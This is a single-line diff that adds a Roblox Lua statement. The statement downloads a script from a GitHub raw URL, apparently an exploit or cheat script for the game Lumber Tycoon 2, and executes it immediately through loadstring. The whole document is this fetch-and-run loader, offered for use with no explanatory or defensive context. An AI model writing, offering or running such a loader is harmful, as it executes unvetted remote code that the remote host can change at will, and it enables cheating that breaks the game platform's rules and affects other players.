@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/ToxicLordDevelopment/LT2/main/Script"), true))()
